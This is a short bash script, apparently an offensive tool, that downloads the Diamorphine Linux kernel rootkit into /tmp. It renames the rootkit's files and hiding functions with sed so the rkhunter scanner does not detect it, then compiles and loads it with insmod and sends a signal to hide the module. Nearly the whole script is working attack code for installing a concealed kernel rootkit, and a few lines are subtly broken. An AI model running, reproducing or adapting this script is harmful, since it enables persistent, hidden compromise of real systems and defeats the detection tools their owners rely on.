#!/usr/bin/env bash
# MY BYPASS FOR ALL ROOTKIT
# author: Darksec github --> https://github.com/DARKSECshell

#list rk
location=$(/usr/bin/ls /tmp/Diamorphine/.darksec/)


#INSTALL DEPENDECIES
MAKE() {

    cd Diamorphine && \
    mkdir .darksec && \
    cp diamorphine.c darksec.c && \
    cp diamorphine.h darksec.h && \
    mv Makefile .darksec && \
    mv darksec.* .darksec && \
    cd /tmp/Diamorphine/.darksec
}


echo "              ,---------------------------,            "
echo "              |  /---------------------\  |            "
echo "              | | rkhunter?             | |            "
echo "              | | rootkit King!         | |            "
echo "              | |                       | |            "
echo "              | |                       | |            "
echo "              | |                       | |            "
echo "              |  \_____________________/  |            "
echo "              |___________________________|            "
echo "            ,---\_____     []     _______/------,      "
echo "          /         /______________\           /|      "
echo "        /___________________________________ /  | ___  "
echo "        |                                   |   |    ) "
echo "        |  _ _ _                 [-------]  |   |   (  "
echo "        |  o o o                 [-------]  |  /    _)_"
echo "        |__________________________________ |/     /  /"
echo "    /-------------------------------------/|      ( )/ "
echo "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /            "
echo "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /              "
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~              "

echo "LINUX RAGE"
echo "[1] DIAMORPHINE"

read -p "[+] --> " choice

case "$choice" in

"1")

	# GIT CLONE FROM DIAMORPHINE

	clear
	echo "YOU CHOICE DIAMORPHINE 7W7"
	cd /tmp
	/usr/bin/git clone https://github.com/m0nad/Diamorphine.git 2>/dev/null
	sleep 2
	MAKE

	#make fake diamorphine from bypass rkhunter

	sed -i 's/diamorphine.o/darksec.o/' Makefile
	sed -i 's/module_hide/module__hide/g' darksec.c
	sed -i 's/module_hidden/module__hidden/g' darksec.c
	sed -i 's/is_invisible/is__invisible/g' darksec.c
	sed -i 's/hacked_getdents/hacked__getdents/g' darksec.c
	sed -i 's/hacked_kill/hacked__kill/g' darksec.c
	sed -i 's/diamorphine/darksec/' darksec.h
	sed -i 's/diamorphine.h/darksec.h/' darksec.c
	sed -i 's/diamorphine_init/darksec_init/g' darksec.c
	sed -i 's/diamorphine_cleanup/darksec_cleanup/g' darksec.c

	# LOAD LKM :)

	clear
	echo "[+] DO YOU WANT LOAD LKM? Y/N?"
	read -p "[+] --> " lkm

	if [ "$lkm" = "Y" ] || [ "$lkm" = "y" ]; then

	echo "YOUR VERSION KERNEL --> " /usr/bin/uname -r
	sleep 1
	make
	sleep 3
	insmod /tmp/Diamorphine/.darksec/darksec.ko
	kill -63 0

	else

	clear
	echo "THANKS FOR USING MY BYPASS ROOTKIT"
	echo "Location ROOTKIT --> " "$location"
	exit

	fi

if [ $( /usr/bin/lsmod | grep -w "darksec" ) = "darksec" ]; then

	echo "[+] ROOTKIT LOADING WITH SUCESS!!"
	exit
else

	echo "ROOTKIT NOT LOADING, TRY AGAIN :("
	exit
fi

;;
esac

